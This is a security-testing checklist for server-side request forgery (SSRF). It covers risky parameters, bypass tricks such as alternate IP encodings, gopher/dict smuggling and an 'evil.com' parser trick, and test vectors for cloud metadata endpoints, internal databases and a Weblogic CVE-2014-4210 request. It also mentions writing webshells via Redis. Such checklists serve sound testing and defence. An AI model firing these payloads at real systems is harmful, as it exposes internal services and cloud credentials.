# SSRF Testing Checklist
> Derived from ~40 real-world vulnerability cases (WooYun 2010-2016)

## High-Risk Parameters to Test
| Parameter | Context |
|-----------|---------|
| `url` | URL fetch/proxy endpoints |
| `target` | Redirect or proxy targets |
| `inputFile` | File processing endpoints |
| `s_url` | Share/callback URLs |
| `imageUrl` | Image proxy/thumbnail |
| `callback` | JSONP/webhook endpoints |
| `link` | URL preview/unfurl |
| `src`, `ref` | Resource loading parameters |

## Common Attack Patterns
1. **Internal network scanning** via Weblogic UDDI Explorer (most common)
   - `/uddiexplorer/SearchPublicRegistries.jsp` (CVE-2014-4210)
2. **URL proxy/fetch endpoints** with no domain restriction
3. **Image proxy SSRF** -- thumbnail generators that fetch arbitrary URLs
4. **Transcoding service SSRF** -- web page conversion services
5. **Webhook/callback SSRF** -- user-supplied callback URLs
6. **File processing SSRF** -- XML/document parsers fetching external resources

## Bypass Techniques
- **IP representations**: `127.0.0.1` → `0x7f000001`, `2130706433`, `0177.0.0.1`
- **DNS rebinding**: Domain that resolves to internal IP
- **URL encoding**: `%31%32%37%2e%30%2e%30%2e%31`
- **Redirect chain**: External URL that 302-redirects to internal address
- **IPv6**: `[::1]`, `[::ffff:127.0.0.1]`
- **URL parser differences**: `http://evil.com#@internal.host`
- **Protocol smuggling**: `gopher://`, `dict://`, `file://`
- **Partial domain match bypass**: `internal.company.com.evil.com`

## Quick Test Vectors
```
# Basic internal network probe
http://127.0.0.1
http://localhost
http://[::1]
http://0x7f000001

# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/

# Common internal services
http://INTERNAL_IP:8080  (Tomcat)
http://INTERNAL_IP:6379  (Redis)
http://INTERNAL_IP:27017 (MongoDB)
http://INTERNAL_IP:3306  (MySQL)
http://INTERNAL_IP:9200  (Elasticsearch)
http://INTERNAL_IP:11211 (Memcached)

# Weblogic SSRF (CVE-2014-4210)
/uddiexplorer/SearchPublicRegistries.jsp
  ?operator=http://INTERNAL_IP:PORT
  &rdoSearch=name&txtSearchname=sdf
  &txtSearchkey=&txtSearchfor=
  &selfor=Business+location
  &btnSubmit=Search

# Protocol smuggling
gopher://internal:6379/_INFO
dict://internal:6379/INFO
```

## Testing Methodology
1. Identify all endpoints that accept URLs or fetch remote resources
2. Test with `http://127.0.0.1` and known internal IP ranges
3. Observe response differences (timing, content, error messages)
4. Use time-based detection: compare response time for open vs closed ports
5. Test alternative IP representations and protocols
6. Check for Weblogic UDDI Explorer on Java applications
7. Probe for cloud metadata services
8. Test redirect-based bypasses if direct internal URLs are blocked

## Port Detection via Response Analysis
| Response | Meaning |
|----------|---------|
| Connection refused / different error | Port closed, host alive |
| Timeout | Host down or filtered |
| Content returned | Port open, service active |
| Specific error message | Port open, protocol mismatch |

## High-Value Internal Targets
- Redis (6379) -- can write webshell via `CONFIG SET dir`
- MongoDB (27017) -- often no auth, full DB access
- Memcached (11211) -- dump cached session data
- Elasticsearch (9200) -- search index data exposure
- Cloud metadata (169.254.169.254) -- IAM credentials
- Internal admin panels (8080, 8443, 9090)

## Common Root Causes
- URL fetch functions with no domain/IP allowlist
- Weblogic UDDI Explorer exposed to internet
- Image proxy services without input validation
- Incomplete blocklist (blocks `127.0.0.1` but not `0x7f000001`)
- No restriction on URL protocol scheme
